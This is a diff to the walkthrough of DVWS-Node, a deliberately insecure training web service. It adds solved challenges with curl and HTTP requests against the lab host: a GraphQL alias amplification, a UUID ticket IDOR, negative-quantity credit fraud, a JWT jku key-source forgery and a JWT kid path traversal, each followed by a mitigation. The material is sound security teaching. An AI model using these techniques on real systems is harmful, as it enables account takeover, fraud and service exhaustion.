@@ -68,6 +68,13 @@ Damn Vulnerable Web Service (DVWS-Node) is a deliberately insecure web applicati
 48. [Undocumented TRACE Diagnostics](#48-undocumented-trace-diagnostics)
 49. [Legacy Login Skips Password Verification](#49-legacy-login-skips-password-verification)
 50. [Excessive Activity Report Page Size](#50-excessive-activity-report-page-size)
+51. [Missing Security Headers](#51-missing-security-headers)
+52. [GraphQL Alias Amplification](#52-graphql-alias-amplification)
+53. [Predictable UUID Support Ticket IDOR](#53-predictable-uuid-support-ticket-idor)
+54. [Resource Store: Get an Item for Free](#54-resource-store-get-an-item-for-free)
+55. [Resource Store: Increase Your Balance by 1,000 Credits](#55-resource-store-increase-your-balance-by-1000-credits)
+56. [JWT JKU Key Source Trust](#56-jwt-jku-key-source-trust)
+57. [JWT KID Path Traversal](#57-jwt-kid-path-traversal)
 
 ---
 
@@ -1671,6 +1678,177 @@ The responses contain 20 and 5,000 records respectively. The records are determi
 
 ---
 
+## 51. Missing Security Headers
+
+**Endpoint:** Homepage and API responses
+
+**Description:** Responses omit `X-Frame-Options`, `Content-Security-Policy`, and `X-Content-Type-Options`, while disclosing the framework through `X-Powered-By: Express`.
+
+### Challenge
+
+Inspect representative responses and identify which browser security headers are missing and which implementation detail is exposed.
+
+### Solution
+
+```sh
+curl -I http://dvws.local/
+curl -I http://dvws.local/api/v1/info
+```
+
+Neither response sets `X-Frame-Options`, `Content-Security-Policy`, or `X-Content-Type-Options`; both include `X-Powered-By: Express`. This is a response header audit exercise.
+
+**Mitigation:** Set an appropriate Content Security Policy, `X-Content-Type-Options: nosniff`, and framing policy such as `X-Frame-Options` or CSP `frame-ancestors`. Remove the `X-Powered-By` header.
+
+---
+
+## 52. GraphQL Alias Amplification
+
+**Endpoint:** `POST /graphql`
+
+**Description:** The endpoint accepts repeated aliases without a query complexity or resolver execution limit. Each alias invokes the database-backed `userSearchByUsername` resolver separately.
+
+### Challenge
+
+Use one GraphQL operation to make several backend lookups, then observe that one HTTP request can invoke the resolver many times.
+
+### Solution
+
+```graphql
+{
+  first: userSearchByUsername(username: "admin") { id username }
+  second: userSearchByUsername(username: "test") { id username }
+  third: userSearchByUsername(username: "nobody") { id username }
+  fourth: userSearchByUsername(username: "admin") { id username }
+}
+```
+
+Send this as the `query` field in a JSON `POST /graphql` request. The response includes a result for each alias. Add more uniquely named aliases to increase the number of resolver executions while still using a single HTTP request.
+
+**Mitigation:** Apply query complexity and depth limits, cap aliases or resolver calls per operation, and set request time and resource budgets.
+
+## 53. Predictable UUID Support Ticket IDOR
+
+**Endpoints:** `POST /api/v2/support/tickets`, `GET /api/v2/support/tickets/:id`
+
+**Scenario:** Support tickets use UUIDv1 identifiers. The notification inbox includes the ID of a ticket owned by the seeded `recovery-victim` account. UUIDv1 encodes a timestamp and may allow nearby IDs to be narrowed down when an attacker knows a ticket was created around the same time. This is a useful clue, not a guarantee that arbitrary UUIDv1 values can be predicted. The authenticated read endpoint checks that a ticket exists but omits an ownership check.
+
+### Challenge
+
+Sign in as `test` (`test` / `test`) and inspect the notification inbox for a ticket UUID. Create a ticket and inspect its UUID format and timestamp. Then request the notified ticket using its UUID, and compare the result with a malformed UUID and a valid but unknown UUID.
+
+```sh
+curl -X POST http://dvws.local/api/v2/support/tickets \
+  -H 'Authorization: Bearer <test-token>' \
+  -H 'Content-Type: application/json' \
+  -d '{"subject":"Training access","message":"I need help accessing a course."}'
+```
+
+### Solution
+
+```http
+GET /api/v2/notifications HTTP/1.1
+Host: dvws.local
+Authorization: Bearer <test-token>
+```
+
+Use the UUID in the support-ticket notification:
+
+```http
+GET /api/v2/support/tickets/6f1d2a40-2f5b-11ef-9a31-0242ac120002 HTTP/1.1
+Host: dvws.local
+Authorization: Bearer <test-token>
+```
+
+The response contains the seeded `recovery-victim` ticket even though the caller is `test`. A malformed UUID returns `400 Invalid ticket ID`; a well-formed unknown UUID returns `404 Support ticket not found`.
+
+**Mitigation:** Use unpredictable identifiers where that helps, and always enforce per-ticket authorization by checking that the authenticated user owns the requested record. Identifier format is not an authorization control.
+
+---
+
+## 54. Resource Store: Get an Item for Free
+
+**Endpoints:** `GET /api/v2/resource-store`, `POST /api/v2/resource-store/orders`
+
+**Scenario:** The authenticated Resource Store starts each user with 100 workspace credits. Prices come from a fixed server catalogue, while orders accept signed integer quantities. The order total is calculated as `unitPrice × quantity`; a negative quantity therefore increases the caller's balance and is stored in their order history.
+
+### Challenge
+
+Sign in to DVWS Cloud and open **Operations → Resource Store**. The wallet starts with 100 credits. Buy one API Monitor for 10 credits and inspect the request in the browser Network panel. Replay it with quantity `-1`:
+
+```http
+POST /api/v2/resource-store/orders HTTP/1.1
+Host: dvws.local
+Authorization: Bearer <your-token>
+Content-Type: application/json
+
+{"itemId":"api-monitor","quantity":-1}
+```
+
+The order response shows the 10 credits returned, restoring the balance to 100. The negative quantity and positive credit change also appear in **Recent orders**, completing the free item challenge.
+
+**Mitigation:** Validate quantity as a positive integer at the server boundary, derive prices from trusted catalogue data, and enforce balance constraints in the same atomic transaction as order creation.
+
+## 55. Resource Store: Increase Your Balance by 1,000 Credits
+
+**Endpoints:** `GET /api/v2/resource-store`, `POST /api/v2/resource-store/orders`
+
+**Prerequisite:** Complete [Challenge 54](#54-resource-store-get-an-item-for-free).
+
+### Challenge
+
+Continue in the Resource Store and inspect the captured order request. The API accepts nonzero integer quantities from -1000 through 1000. Change the API Monitor quantity to `-100`:
+
+```http
+POST /api/v2/resource-store/orders HTTP/1.1
+Host: dvws.local
+Authorization: Bearer <your-token>
+Content-Type: application/json
+
+{"itemId":"api-monitor","quantity":-100}
+```
+
+At 10 credits per item, the response shows a 1,000-credit increase. The order history records quantity `-100` and a positive 1,000-credit change. Zero, fractional, and out-of-range quantities and unknown item IDs are rejected. Wallets and orders are scoped to the authenticated user.
+
+**Mitigation:** Validate quantity as a positive integer at the server boundary, derive prices from trusted catalogue data, and enforce balance constraints in the same atomic transaction as order creation.
+
+## 56. JWT JKU Key Source Trust
+
+**Endpoint:** `GET /api/v2/jwt-key-lab/jku/profile`
+
+**Description:** The isolated lab verifier follows the JWT `jku` header and trusts the matching public key found there. An attacker can publish their own JWK set, sign a token with its private key, and choose a synthetic profile subject. The endpoint returns only fixed lab profiles and does not authenticate or authorize access to real accounts.
+
+### Challenge
+
+Create an RSA key pair and publish its public key as a JWK set on a URL reachable from the DVWS server. Sign an RS256 JWT with header fields `jku` (the JWK set URL) and `kid` (the key ID), and payload `{"sub":"admin@dvws.local"}`. Send it as a bearer token:
+
+```sh
+curl http://dvws.local/api/v2/jwt-key-lab/jku/profile \
+  -H 'Authorization: Bearer <attacker-signed-token>'
+```
+
+The lab accepts the token because it obtains the verification key from the token's own `jku` value.
+
+**Mitigation:** Bind each issuer to a server-configured key set or pinned keys. Do not let an untrusted token choose the key source; validate `iss`, `aud`, allowed algorithms, and key ID against trusted configuration. The JWK fetch has a timeout and response-size limit, but the route is intentionally vulnerable and belongs only in a local training deployment.
+
+## 57. JWT KID Path Traversal
+
+**Endpoint:** `GET /api/v2/jwt-key-lab/kid/profile`
+
+**Description:** The isolated HS256 verifier uses the JWT `kid` value as a filesystem path without constraining it to the key directory. Its legacy key loader treats the selected file as Base64 key material. Traversing to `/dev/null` produces the lab's one-byte NUL signing secret (`AA==`), which allows an attacker to create a valid token for a synthetic profile.
+
+### Challenge
+
+Sign an HS256 JWT with header `{"alg":"HS256","kid":"../../../../../../dev/null"}` and payload `{"sub":"admin@dvws.local"}`. Use `AA==` as the HMAC secret, then send the token:
+
+```sh
+curl http://dvws.local/api/v2/jwt-key-lab/kid/profile \
+  -H 'Authorization: Bearer <attacker-signed-token>'
+```
+
+The handler resolves `kid` outside its intended key directory and accepts the token signed with the NUL-byte key. The route returns only synthetic lab data.
+
+**Mitigation:** Treat `kid` as an identifier, not a path. Look it up in a fixed in-memory or configured key map; if files must be used, canonicalize the path and verify it remains beneath the key directory. Use high-entropy keys and pin the expected algorithm.
+
 ## Appendix: Quick Reference
 
 ### Endpoints by Vulnerability Category
@@ -1679,6 +1857,7 @@ The responses contain 20 and 5,000 records respectively. The records are determi
 |----------|-----------|
 | **Injection** | `/api/v2/passphrase`, `/api/v2/notesearch`, `/api/v2/sysinfo/:cmd`, `/dvwsuserservice`, `/api/v2/release/:r`, `/api/v2/users/ldap-search` |
 | **Broken Auth** | All authenticated endpoints (JWT none/weak secret), `/api/v1/login`, `/api/v2/session-lab/secondary-token`, `/api/v2/users/change-password` |
+| **JWT Key Handling** | `/api/v2/jwt-key-lab/jku/profile`, `/api/v2/jwt-key-lab/kid/profile` |
 | **Data Exposure** | `/api/v1/info`, `/api/v2/users`, `/api/v2/users/:id/profile-details`, `/api/v2/users/profile`, `/api/v2/account-recovery/lookup`, `/graphql` (userLogin, userSearchByUsername, userFindbyId) |
 | **XXE/XML** | `/dvwsuserservice`, `/api/v2/notes/import/xml`, `/api/v2/users/profile/export/xml`, `/api/v2/users/profile/import/xml` |
 | **Access Control** | `/api/v2/notes/:id`, `/api/v2/passphrase/:user`, `/api/v2/sysinfo/:cmd`, `/api/v2/users`, `/api/v2/users/:id/profile-details`, `/api/v2/account-recovery/lookup`, `/api/v2/account-recovery/reset` |
@@ -1687,9 +1866,11 @@ The responses contain 20 and 5,000 records respectively. The records are determi
 | **Client-Side** | CORS (all endpoints), CSRF (`/api/v2/admin/create-user`, `/api/v2/cookie-lab/action`), XSS (various), JSONP (`/api/v2/jsonp-lab/profile`) |
 | **WebSocket** | Cross-Site WebSocket Hijacking (`/ws/notifications`) |
 | **Resource Consumption** | `/api/v2/reports/activity` |
-| **GraphQL** | `/graphql` (introspection, IDOR, file write, batching, data exposure) |
+| **GraphQL** | `/graphql` (introspection, IDOR, file write, batching, data exposure, alias amplification) |
+| **Security Headers** | Homepage and API responses (missing browser protections, framework disclosure) |
 | **Template Injection** | `/api/v2/greeter` |
 | **Unsafe Deserialization** | `/api/v2/integrations/supplier-orders/import` (YAML function tag) |
 | **Path Traversal** | `/api/download`, `/api/v2/reports/monthly` |
 | **Mass Assignment** | `/api/v2/users`, `/api/v2/users/profile/import/xml`, `/api/v2/users/notification-preferences` |
 | **Hidden Endpoint** | `TRACE /internal/diagnostics` |
+| **Business Logic** | `/api/v2/resource-store/orders` (negative quantity increases credits) |
